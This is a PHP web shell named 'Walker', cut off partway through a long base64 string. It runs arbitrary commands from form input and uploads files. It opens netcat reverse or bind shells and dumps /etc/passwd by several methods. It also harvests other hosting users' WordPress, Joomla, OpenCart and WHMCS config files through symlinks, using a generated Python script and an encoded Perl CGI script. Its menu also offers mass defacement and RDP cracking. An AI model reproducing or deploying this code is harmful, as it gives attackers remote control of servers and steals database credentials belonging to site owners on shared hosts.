<?php

echo '<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<title>[ ';echo $_SERVER['SERVER_NAME']; echo '/Walker ]</title>
<style>
body{
         background-color: black;
		 background-image:url("https://66.media.tumblr.com/5be8fad233983ed129a5d1e77535137f/tumblr_oc3yn1OFO21uhw068o1_1280.gif");
         background-position:center;
		 background-repeat: no-repeat;
         background-attachment: fixed;
}
#content .first{
    background-color: #471321;
}
table{
    border: 1px;
}
H1{
    font-family: "Typesenses", cursive;
}
a{
    color: white;
    text-decoration: none;
}
a:hover{
    color: silver;
}
#content tr:hover{
    background-color: #471321;
}
hr {
	border: 3px #db003d solid;
	box-shadow: 2px 2px 15px 2px #471321;
}
.button {
	  background-color: black;	
	  color: white;
	  border:3px solid #db003d;
	  text-size: 2px;
	  width: 180px;
	  height: 25px;
	  margin: 2px;
	  box-shadow: 2px 2px 15px 2px #471321;
	 }
.button:hover {
		 background-color: #471321;
		 opacity: 0.6;
	}
.texxt2 {
	  background-color: black;	
	  color: white;
	  border:1px solid #471321;
	  width: 150px;
	  height: 25px;
	  margin: 2px;
	  text-align: center;
}
.button2 {
	background-color: black;	
	  color: white;
	  border:1px solid #471321;
	  width: 150px;
	  height: 25px;
	  margin: 2px;
}
.button2:hover {
	background-color: #471321;
	opacity: 0.6;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</head>
<body>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><hr width=100%>
<tr>
<td><font color="#db003d">Uname: </font><font color="white">';echo php_uname();echo '</font></td></tr><tr>
<td><font color="#db003d">PHP: </font><font color="white">';echo phpversion();echo '</font></td></tr><tr>
<td><font color="#db003d">Safe Mode: </font><font color="white">';if( ini_get('safe_mode') ){echo ON;}else{echo OFF;}echo '</font></td></tr><tr>
<td><font color="#db003d">Server Ip: </font><font color="white">';echo $_SERVER['SERVER_ADDR'];echo '  <font color="#db003d">Your Ip: </font>'; echo $_SERVER["REMOTE_ADDR"]; echo '</font></td></tr><tr>
<td><font color="#db003d">SoftWare: </font><font color="white">';echo $_SERVER['SERVER_SOFTWARE'];echo '</font></td></tr><tr>
<td><font color="#db003d">Date: </font><font color="white">';echo date("d.m.Y H:i:s");echo '</font></td></tr><tr>
<td><font color="#db003d">PWD: </font>';
if(isset($_GET['path'])){
    $path = base64_decode($_GET['path']);
}else{
    $path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path='.base64_encode("/").'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo base64_encode($linkpath);
    echo '">'.$pat.'</a><font color="white">/</font>';
}
echo '</td></tr><tr><td><hr width=100%><br><hr width=100%>
<form method="post" align="center">
<input type="submit" class="button" name="upload" value="Upload" />
<input type="submit" class="button" name="etcpasswd" value="/etc/passwd Bypass" />
<input type="submit" class="button" name="safemode" value="Safe Mode" />
<input type="submit" class="button" name="vhostbypass" value="Vhost Config Grabber" />
<input type="submit" class="button" name="commandd" value="Command" />
<input type="submit" class="button" name="backconnect" value="BackConnect" />
<input type="submit" class="button" name="massdeface" value="Mass Deface" />
<input type="submit" class="button" name="rdpcrack" value="RDP Cracker" />
<input type="submit" class="button" name="litespeedconfig" value="LiteSpeed Config Grabber" />
</form><hr width=100%><br>';
if (isset($_POST['commandd']) || isset($_POST['commmandd'])){
	echo '<br><hr width=100%><center>
	<form method="post">
	   <input style="background-color:black;border:2px solid #471321;text-align:center;color:#471321;" type="text" name="commmandd"/><input type="submit" value="Gönder" class="button"/>
	</form>
	</center>';
	if(isset($_POST['commmandd'])){
		echo '<br><br><font color="white" >';
		echo system($_POST['commmandd']).'</font>';
		
	}
	echo '<hr width=100%><br><br>';
}

if (isset($_POST['bcbut'])){
	if(bcop == "Reverse Shell")
	{
		system("netcat ".$_POST['ipadress']." ".$_POST['port']);
	}
	else{
		system("netcat -lvp ".$_POST['port']);
	}
}
if (isset($_POST['backconnect'])){
	echo '<br><hr width=100%><center>
	<form method="post">
	   <select style="background-color:black;border:2px solid #471321;text-align:center;width:150px;height:25px;color:#471321;" name="bcop">
	       <option>Reverse Shell</option>
		   <option>Bind Shell</option>
	   </select>  
	   <input type="text" class="texxt2" name="ipadress" value="';echo $_SERVER["REMOTE_ADDR"]; echo '"/>   
	   <input type="text" class="texxt2" name="port" value="4444"/>   
	   <input type="submit" style="background-color:black;border:2px solid #db003d;color:#471321; height:30px;border-radius: 50px;" name="bcbut" value=">>"/>
	</form>
	</center><hr width=100%><br><br>';
}
if (isset($_POST['litefuckk'])){
	$dattta = $_POST['litefuck'];
	$litepy = '# -*- coding:UTF-8 -*-
import re
import os
import random

r = open("etcpass.txt", "r").read().split()
os.system("mkdir LiteSpeed-Config")
os.system("cd LiteSpeed-Config && mkdir wordpress && mkdir joomla && mkdir opencart")
for i in r:
    if re.search("/home/", i):
        s = i.split(":")
        os.system("cd LiteSpeed-Config && cd wordpress && mkdir "+s[0]+" && cd "+s[0]+" && ln -s "+s[5]+"/public_html/wp-config.php HEADER")
        os.system("cd LiteSpeed-Config && cd opencart && mkdir "+s[0]+" && cd "+s[0]+" && ln -s "+s[5]+"/public_html/config.php HEADER")
        os.system("cd LiteSpeed-Config && cd joomla && mkdir "+s[0]+" && cd "+s[0]+" && ln -s "+s[5]+"/public_html/configuration.php HEADER")
';
	touch("lite.py");
	touch("etcpass.txt");
	$liteyaz = fopen('lite.py', 'w');
	fwrite($liteyaz, $litepy);
	fclose($liteyaz);
	$etcyazz = fopen('etcpass.txt', 'w');
	fwrite($etcyazz, $dattta);
	fclose($etcyazz);
	system("python lite.py");
	echo '<center><a href="LiteSpeed-Config"><font color="#db003d">Tıkla</font></a></center>';
}
if (isset($_POST['litespeedconfig'])){
	echo '<br><hr width=100%><center>
	<form method="post">
	 <textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="17" cols="70"></textarea><br>
     <input type="submit" class="button" name="litefuckk" value="Başla" />
	</form>
	</center>';
	echo '<hr width=100%><br><br>';
}
if (isset($_POST['etcpasswd']) || isset($_POST['systemfunc']) || isset($_POST['passthru']) || isset($_POST['exec']) || isset($_POST['shell_exec']) || isset($_POST['posixgetpwuid'])){
   echo '<br><hr width=100%><center>
   <form method="post">
       <input type="submit" name="systemfunc" value="System Function" class="button2" />
	   <input type="submit" name="passthru" value="Passthru Function" class="button2" />
	   <input type="submit" name="exec" value="Exec Function" class="button2" />
	   <input type="submit" name="shell_exec" value="Shell_exec Function" class="button2" />
	   <input type="submit" name="posixgetpwuid" value="Posixgetpwuid Function" class="button2" />
   </form>';
   if (isset($_POST['systemfunc']))
   {
	  echo '<br><textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="25" cols="100">';echo system("cat /etc/passwd"); echo '</textarea><br>';
   }
   else if (isset($_POST['passthru']))
   {
	    echo '<br><textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="25" cols="100">';echo passthru("cat /etc/passwd"); echo '</textarea><br>';
   }
   else if (isset($_POST['exec']))
   {
	    echo '<br><textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="25" cols="100">';echo exec("cat /etc/passwd"); echo '</textarea><br>';
   }
   else if (isset($_POST['shell_exec']))
   {
	    echo '<br><textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="25" cols="100">';echo shell_exec("cat /etc/passwd"); echo '</textarea><br>';
   }
   else if (isset($_POST['posixgetpwuid']))
   {   
	    echo '<br><textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="litefuck" rows="25" cols="100">';
        for($uid=0;$uid<60000;$uid++){  
                      $ara = posix_getpwuid($uid);
                      if (!empty($ara)) {
                           while (list ($key, $val) = each($ara)){
                           print "$val:";
                            }
                            print "\n";
                             }
		}
		echo '</textarea><br>';
   }
   echo '</center><hr width=100%><br><br>';
}
if (isset($_POST['upload'])){
	echo '<br><hr width=100%>
<center><form enctype="multipart/form-data" method="POST">
<input style="background-color: black;border: 1px solid #471321;" type="file" name="file" />
<input class="button2" type="submit" value="Upload" /></center></form><hr width=100%><br><br>';
}
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        $dasdas=2;
    }
}
if (isset($_POST['vhostbypass']))
{
 echo '<br><hr width=100%>';
@mkdir('Vhost-Config', 0755);
@chdir('Vhost-Config');
        $filhat = fopen (".htaccess" , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cin
AddHandler cgi-script .cin
AddHandler cgi-script .cin";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$config = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPi46IEZhbGxhZyBHYXNzcmluaSBQcml2OCB2aG9zdHMgQ29uZmlnIEdyYWJiZXIgdjAuMTouPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoubmV3U3R5bGUxIHsNCiBmb250LWZhbWlseTogdWJ1bnR1Ow0KIGZvbnQtc2l6ZTogeC1sYXJnZTsNCiBjb2xvcjogd2hpdGU7DQogYmFja2dyb3VuZC1jb2xvcjogIzE1MTUxNTsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCg0KDQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPi46IENvZGVkIGJ5IEZhbGxhZyBHYXNzcmluaSB8VHVuaXNpYW4gRmFsbGFnYSBUZWFtIDouPC9wPg0KPHA+Z2Fzc2JvdEBnbWFpbC5jb208L3A+DQo8cD5odHRwOi8vZmIuY29tL2dhc3NyaW5pLmdvdi50bjwvcD4nOw0Kb3BlbmRpcihteSAkZGlyICwgIi92YXIvd3d3L3Zob3N0cy8iKTsNCmZvcmVhY2goc29ydCByZWFkZGlyICRkaXIpIHsNCiAgICBteSAkaXNEaXIgPSAwOw0KICAgICRpc0RpciA9IDEgaWYgLWQgJF87DQokc2l0ZXNzID0gJF87DQoNCg0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLW9zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1zaG9wcGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zYWxlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5pbmMucGhwJywkc2l0ZXNzLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLW1lbWJlcnMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1mb3J1bS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25mLnBocCcsJHNpdGVzcy4nLTUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYWRtaW4vY29uZmlnLnBocCcsJHNpdGVzcy4nLTQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtV1AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1wcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbmV3cy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1uZXcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1ibG9ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob21lL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtcHJvdGFsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NpdGUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC10ZXN0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCRzaXRlc3MuJy1pYnByb2FyY2FkZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtcHJvdGFsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvby9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvby50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtY21zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1uZXcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12Yn5jb25maWcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12YjN+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12YjF+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1pbmNsdWRlcy12Yi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0J